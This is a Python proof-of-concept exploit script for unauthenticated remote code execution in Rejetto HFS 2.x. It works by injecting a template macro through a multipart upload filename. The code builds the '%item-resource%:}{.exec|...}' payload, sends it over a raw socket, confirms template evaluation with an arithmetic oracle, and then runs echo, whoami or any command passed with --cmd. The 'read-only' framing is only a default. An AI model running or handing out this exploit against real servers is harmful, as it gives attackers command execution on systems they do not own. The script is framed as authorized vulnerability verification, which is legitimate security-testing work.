#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC / verification script — Rejetto HFS 2.x unauthenticated RCE via
multipart upload filename template injection (the `%item-resource%` symbol).

Feed the payload in a `multipart/form-data` filename. The value is inserted into
the server-side template symbol map WITHOUT escaping, and `xtpl()` re-substitutes
it, so the `:}` terminator closes the engine quote and the following `{.exec|..}`
macro is dispatched to the OS.

READ-ONLY by design: only an arithmetic oracle and `echo`/`whoami` (or a command
you pass with --cmd) are executed. No shell callbacks, no persistence, no writes.
`{.exec|...}` is itself a command execution primitive — this script deliberately
keeps it to non-destructive commands so the PoC stays a proof, not a weapon.

Usage
-----
    python3 verify_hfs2_upload_ssti.py --target http://192.168.1.235:8090
    python3 verify_hfs2_upload_ssti.py --target http://TARGET:8090 --cmd "hostname"
    USE_BURP=0 python3 verify_hfs2_upload_ssti.py --target http://TARGET:8090   # direct
    python3 verify_hfs2_upload_ssti.py --target http://TARGET:8090              # via Burp

Proxy: traffic is routed to Burp by default (USE_BURP=1, BURP_PROXY=127.0.0.1:8080)
so every packet can be inspected/replayed. Set USE_BURP=0 for a direct connection.

Author : @wgetnz
License: for authorized security testing and vulnerability verification only.
"""
import argparse
import os
import socket
import sys
from urllib.parse import urlsplit

BOUNDARY = "X"
# The token that escapes the engine's {: ... :} quoting region. `%item-resource%`
# is echoed from the raw filename; the trailing `:}` closes the quote.
INJECT_PREFIX = "%item-resource%:}"


def parse_target(url):
    p = urlsplit(url if "://" in url else "http://" + url)
    host = p.hostname or ""
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    if not path.endswith("/"):
        path += "/"
    return host, port, path


def build_multipart(filename, field=b"hi"):
    """Build the multipart body byte-exactly. Nothing here may be URL-encoded."""
    body = (b"--" + BOUNDARY.encode() + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="'
            + filename.encode("latin-1") + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n"
            + field
            + b"\r\n--" + BOUNDARY.encode() + b"--\r\n")
    return body


def send_raw(host, port, path, body, timeout=25):
    """POST the multipart body over a raw socket, optionally through an HTTP proxy.

    A raw socket (rather than requests/curl) is required: several clients
    normalise or URL-encode the `%` / `{` / `|` characters in the filename and the
    payload then never reaches the macro engine.
    """
    use_burp = os.environ.get("USE_BURP", "1") == "1"
    burp = os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")

    if use_burp:
        bp = urlsplit(burp if "://" in burp else "http://" + burp)
        peer = (bp.hostname or "127.0.0.1", bp.port or 8080)
        request_uri = "http://%s:%d%s" % (host, port, path)   # absolute form for proxies
    else:
        peer = (host, port)
        request_uri = path

    req = ("POST " + request_uri + " HTTP/1.1\r\n"
           "Host: " + host + ":" + str(port) + "\r\n"
           "Content-Type: multipart/form-data; boundary=" + BOUNDARY + "\r\n"
           "Content-Length: " + str(len(body)) + "\r\n"
           "Connection: close\r\n"
           "User-Agent: hfs2-upload-ssti-poc/1.0\r\n\r\n").encode("latin-1") + body

    s = socket.create_connection(peer, timeout=timeout)
    try:
        s.sendall(req)
        chunks = []
        while True:
            try:
                b = s.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        return b"".join(chunks), req
    finally:
        s.close()


def split(resp):
    if b"\r\n\r\n" in resp:
        head, _, body = resp.partition(b"\r\n\r\n")
        return head.decode("latin-1", "replace"), body.decode("latin-1", "replace")
    return resp.decode("latin-1", "replace"), ""


def call(host, port, path, macro, echo=True):
    """Deliver one macro through the upload-filename injection."""
    payload = INJECT_PREFIX + "{" + macro + "}"
    body = build_multipart(payload)
    resp, req = send_raw(host, port, path, body)
    if echo:
        print("[>] POST http://%s:%d%s  (multipart filename payload)" % (host, port, path))
        print("    payload filename: %s" % payload)
        print("[<] %s" % split(resp)[0].split("\r\n")[0])
        print("    body: %s" % split(resp)[1][:400].replace("\r\n", "\\r\\n"))
    return split(resp)[1]


def main():
    ap = argparse.ArgumentParser(description="HFS 2.x upload-filename SSTI -> RCE verification (read-only)")
    ap.add_argument("--target", default=os.environ.get("TARGET", "http://TARGET:8090"),
                    help="base URL, e.g. http://192.168.1.235:8090")
    ap.add_argument("--cmd", default="echo ZZRCE7734",
                    help="command to run via {.exec|...} (keep it read-only)")
    args = ap.parse_args()

    host, port, path = parse_target(args.target)
    print("=" * 74)
    print(" HFS 2.x upload-filename template injection -> RCE  (unauth, read-only PoC)")
    print(" target: %s:%d%s" % (host, port, path))
    print(" proxy : %s" % ("Burp " + os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")
                           if os.environ.get("USE_BURP", "1") == "1" else "direct"))
    print("=" * 74)

    # --- Step 1: arithmetic oracle. Proves the template engine evaluates our expression.
    print("\n[1] Template-evaluation oracle  (.add|7000000|788  ->  expect 7000788)")
    b1 = call(host, port, path, ".add|7000000|788.")
    if "7000788" not in b1:
        print("\n[-] NOT VULNERABLE (oracle did not evaluate)")
        return 1
    print("[+] template engine evaluated the injected expression")

    # --- Step 2: command execution with an unmistakable marker.
    print("\n[2] Command execution  ({.exec|%s.})" % args.cmd)
    marker = "ZZRCE7734"
    b2 = call(host, port, path, ".exec|" + args.cmd + "|timeout=20|out=z.}{.^z.")
    if marker not in b2:
        print("\n[-] oracle passed but command output not found")
        return 1
    print("[+] command output %r observed -> unauthenticated RCE confirmed" % marker)

    # --- Step 3: whoami, to show the privilege context of the HFS process.
    print("\n[3] Privilege context  ({.exec|whoami.})")
    call(host, port, path, ".exec|whoami|timeout=20|out=z.}{.^z.")

    print("\n" + "=" * 74)
    print("[+] VULNERABLE: unauthenticated remote code execution via upload filename")
    print("=" * 74)
    return 0


if __name__ == "__main__":
    sys.exit(main())
